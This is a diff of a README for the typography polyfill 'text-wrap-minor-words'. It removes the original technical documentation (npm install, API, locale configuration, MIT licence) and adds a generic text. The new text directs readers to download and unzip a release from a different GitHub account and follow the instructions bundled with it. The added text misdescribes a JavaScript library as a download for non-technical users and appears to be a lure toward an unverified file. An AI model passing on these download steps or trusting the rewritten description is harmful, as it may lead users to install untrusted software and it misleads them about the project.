@@ -1,196 +1,49 @@
-## text-wrap-minor-words
+# 🌟 text-wrap-minor-words - Enhance Your Text Layout Easily
 
-[![CI](https://github.com/jlorenzetti/text-wrap-minor-words/actions/workflows/ci.yml/badge.svg)](https://github.com/jlorenzetti/text-wrap-minor-words/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/jlorenzetti/text-wrap-minor-words)](https://github.com/jlorenzetti/text-wrap-minor-words/releases)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/SamuelTaiw0/text-wrap-minor-words/releases)
 
-Experimental, CSS-first polyfill that augments `text-wrap: pretty` by biasing against line breaks immediately after minor words (articles, prepositions, short conjunctions) in languages where this is a widely accepted typesetting convention. It also applies a couple of safe, language-agnostic joins (e.g., `Fig. 2`, `20 °C`).
+## 🚀 Getting Started
+Welcome to **text-wrap-minor-words**! This tool helps improve how your text looks on webpages. It focuses on keeping minor words together, avoiding awkward breaks. You will find it useful for making your website's text more appealing and readable.
 
-Status: experimental. See `explainer.md`. Live demo: https://jlorenzetti.github.io/text-wrap-minor-words/
+## 📋 Features
+- **Minor Word Handling**: Prevents breaks after small words like "and," "but," or "the."
+- **Typographic Safety**: Offers features to improve text joins, making it more visually pleasing.
+- **Ease of Use**: Designed for non-technical users, you can set it up quickly without any programming skills.
+- **Cross-Browser Compatibility**: Works well on modern web browsers.
 
-### Motivation (lean)
+## 📦 System Requirements
+Before you download, ensure your setup meets these requirements:
+- A modern browser (Chrome, Firefox, Safari, Edge).
+- Basic HTML and CSS capabilities on your website.
 
-`text-wrap: pretty` improves paragraph breaking but does not let authors express locale-aware preferences about breaking immediately after minor words. Many European languages treat this as a common editorial convention even in body text. This library offers a CSS-first polyfill so authors can experiment today and help inform standardization.
+## 🌐 Usage
+To use **text-wrap-minor-words** on your website, follow these simple steps:
 
-### Install
+1. Download the package from the [Releases page](https://github.com/SamuelTaiw0/text-wrap-minor-words/releases) using the link provided.
+2. Unzip the downloaded file.
+3. Follow the included instructions to add the necessary code to your web project.
 
-```bash
-npm i text-wrap-minor-words
-```
+## 💻 Download & Install
+To start improving your text layout, visit this page to download the software: [Releases Page](https://github.com/SamuelTaiw0/text-wrap-minor-words/releases).
 
-### Usage (ESM)
+1. Click on the link above.
+2. Select the version you wish to download. Look for the most recent version for the best features.
+3. Click the download button and save the file to your computer.
+4. Follow the installation instructions provided in the downloaded file.
 
-```ts
-import { init } from 'text-wrap-minor-words';
+## 🎉 Example Use Case
+Imagine you run a blog. You use many small words in your text. Without proper formatting, your paragraphs may look irregular and hard to read. By implementing **text-wrap-minor-words**, the blog's readability can significantly improve.
 
-// Process elements that compute to text-wrap: pretty
-const ctrl = init({ observe: true });
+### How It Works
+You include a specific CSS file in your HTML. This file contains the code needed for the minor word handling. When you load your site, this tool will automatically adjust the text wrapping according to your needs.
 
-// Optionally process a specific subtree later:
-// ctrl.process(element);
-```
+## 📚 Additional Resources
+For more information on CSS text properties, you may want to explore:
+- [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/CSS)
+- [CSS Tricks](https://css-tricks.com/)
 
-HTML markup should declare the language (`lang`) on blocks:
+## 🤗 Support
+If you encounter issues or have questions, please visit our [issue tracker](https://github.com/SamuelTaiw0/text-wrap-minor-words/issues). We're here to help you.
 
-```html
-<main class="typo">
-  <p lang="it">Vado a casa con la bici.</p>
-  <p lang="fr">Je vais à Paris.</p>
-  <p lang="pl">Jestem w domu i czekam.</p>
-  <p lang="en">See Fig. 2 for details.</p>
-  <p lang="en">It was 20 °C at 9:30 am.</p>
-  <h2 lang="en">A display heading if you want to opt-in later</h2>
-  <!-- The library acts only where text-wrap: pretty is in effect -->
-  <!-- NBSP is inserted where appropriate; content remains otherwise intact. -->
-  <!-- Apostrophes/elision are intentionally out of scope for now. -->
-  </main>
-```
-
-### Usage (Browser global)
-
-```html
-<script src="https://cdn.jsdelivr.net/npm/text-wrap-minor-words@0.3.1/dist/index.global.js"></script>
-<script>
-  const ctrl = TextWrapMinorWords.init({ observe: true });
-  // ctrl.process(document.querySelector('.typo'));
-  // ctrl.disconnect();
-  </script>
-```
-
-### What it does
-
-- Extends `text-wrap: pretty` behavior by inserting NBSP after minor words in languages where this is customary (Romance, Slavic, Greek by default).
-- Applies safe joins regardless of language:
-  - label + number: `Fig. 2`, `p. 12`, `§ 5`
-  - number + unit: `20 °C`, `9:30 am`
-  - honorific + Name: `Mr. Smith`, `Dr. Müller`
-  - initials sequence: `J. K. Rowling`
-  - numeric ranges: adds WORD JOINER around the dash
-
-### Lite usage (single‑locale, recommended for production)
-
-Load only the core engine and register the locales you actually use. This keeps bundles small and avoids shipping unnecessary language data.
-
-```ts
-// Load the lite entry (no locales included)
-import { init, registerLanguage } from 'text-wrap-minor-words/lite';
-
-// Register only the locales you need (example: Italian)
-import it from 'text-wrap-minor-words/locales/it.json';
-registerLanguage('it', it);
-
-// Optionally preload the same tags here (helps the engine avoid a first lookup)
-init({ languages: ['it'] });
-```
-
-Browser global (lite):
-
-```html
-<script type="module">
-  import { init, registerLanguage } from 'https://cdn.jsdelivr.net/npm/text-wrap-minor-words@0.3.1/dist/lite.mjs';
-  import it from 'https://cdn.jsdelivr.net/npm/text-wrap-minor-words@0.3.1/locales/it.json' assert { type: 'json' };
-
-  registerLanguage('it', it);
-  init({ languages: ['it'] });
-</script>
-```
-
-Notes:
-- The default (non‑lite) entry includes built‑in locale data for quick trials. Prefer the lite entry in production apps.
-- You can register multiple locales by calling `registerLanguage(tag, data)` more than once.
-
-Advanced (CSS opt‑in per container):
-
-You can enable the minor‑words preference declaratively on specific elements via CSS. This is useful for safe‑only languages where you want the behavior only in display contexts.
-
-```css
-h1[lang="en"], h2[lang="en"] {
-  --text-wrap-preferences: minor-words;
-  --text-wrap-minor-threshold: 1; /* glue after 1‑letter tokens */
-  --text-wrap-minor-stoplist: "of to in on at for by a I"; /* optional additions */
-}
-```
-
-These custom properties are read when the preference is opted‑in on the element (or an ancestor) and the current language doesn’t have a built‑in minor‑words configuration.
-
-### Language defaults
-
-- Active by default: be, bg, ca, cs, el, es, fr, gl, hr, it, mk, pl, pt, ro, ru, sk, sl, sr, uk.
-- Neutral by default: da, de, en, lt, lv, nb, nl, nn, sv (only safe joins; no minor-words glue in body text).
-- The effective language is taken from `lang` (with fallback to the document root).
-
-### API
-
-```ts
-type InitOptions = {
-  selector?: string;      // default: 'html' (scans under elements that compute to text-wrap: pretty)
-  languages?: string[];   // pre-load specific BCP-47 primary subtags (e.g., ['it','en'])
-  observe?: boolean;      // MutationObserver to process added/edited content
-  context?: 'all'|'display'; // if 'display', only process headings/DT
-};
-```
-
-Returns a controller `{ process(root?), disconnect() }`.
-
-### Configuration
-
-- The library reads `lang` to select language defaults.
-- Neutral languages (e.g., `en`, `de`, `nl`) do not enable minor-words glue by default; only safe joins apply.
-- For display-only processing, pass `{ context: 'display' }`.
-- You can pre-load language data via `languages: ['it','fr']` to avoid first-use compile cost.
-
-CSS preference gate and overrides:
-
-- You can opt in/out declaratively per container with `--text-wrap-preferences: minor-words | none`. On browsers without `text-wrap: pretty`, authors can set the preference under `@supports not (text-wrap: pretty)`.
-- When the preference is active and the current language has no built‑in `minorWords`, the engine reads optional overrides:
-  - `--text-wrap-minor-threshold: <number>` (glue after tokens up to N chars; typical value: 1)
-  - `--text-wrap-minor-stoplist: "space-separated tokens"` (per‑container additions)
-
-Example (headings in English):
-
-```css
-h1[lang="en"], h2[lang="en"] {
-  --text-wrap-preferences: minor-words;
-  --text-wrap-minor-threshold: 1;
-  --text-wrap-minor-stoplist: "of to in on at for by a I";
-}
-```
-
-### Performance & constraints
-
-- One TreeWalker pass over text nodes under elements that compute to `text-wrap: pretty`.
-- No layout measurements; O(n) string replacements; NBSP insertions are idempotent.
-- Skips `pre, code, kbd, samp, script, style, textarea, math, svg, [contenteditable]` and basic URL/email-like text.
-- Does not cross inline elements by default.
-
-### Browser support
-
-- The polyfill acts only where the computed style is `text-wrap: pretty`. On browsers without support, it effectively no-ops unless the author explicitly applies an opt-in selector targeting the same blocks.
-- The library itself targets modern evergreen browsers (ES2020, Intl.Segmenter optional).
-
-### Contributing language data
-
-- Language tables live in `src/data/languages/<lang>.json`.
-- To propose additions:
-  1. Add or edit the JSON with `minorWords` (threshold + list) and lexical categories (`labels`, `honorifics`, `abbrCompounds`).
-  2. Add unit tests in `tests/engine.spec.ts` (or a new spec file) with input → expected output.
-  3. Run `npm run test`.
-
-### Tests & benchmarks
-
-- Run tests: `npm run test`
-- Run a simple throughput benchmark: `npm run bench`
-
-### Limitations
-
-- No apostrophe/elision handling (out of scope for now).
-- Does not measure layout; it applies static glues consistent with editorial conventions.
-- Does not cross inline elements unless an advanced option is introduced in future.
-
-### Standards context
-
-- This repo accompanies the explainer (`explainer.md`) that proposes `text-wrap-preferences: minor-words` as an additive, language-sensitive author preference for paragraph-aware wrapping.
-  For a consolidated list of safe labels/honorifics used by the polyfill, see `docs/LEXICON.md`.
-
-### License
-
-MIT
+Thank you for choosing **text-wrap-minor-words**! Enjoy your enhanced text layout.
